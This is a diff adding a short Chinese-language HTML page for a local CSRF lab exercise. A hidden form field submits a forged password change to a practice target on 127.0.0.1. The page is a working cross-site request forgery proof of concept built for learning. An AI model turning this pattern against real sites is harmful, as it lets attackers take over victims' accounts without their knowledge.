@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <title>本地 CSRF 实验</title>
+</head>
+<body>
+  <h1>CSRF 实验页面</h1>
+  <p>点击按钮，向本地靶场提交改密码请求。</p>
+
+  <form
+    action="http://127.0.0.1:5000/api/change-password"
+    method="POST"
+  >
+    <input
+      type="hidden"
+      name="new_password"
+      value="ChangedByCSRF123!"
+    >
+    <button type="submit">触发实验请求</button>
+  </form>
+</body>
+</html>
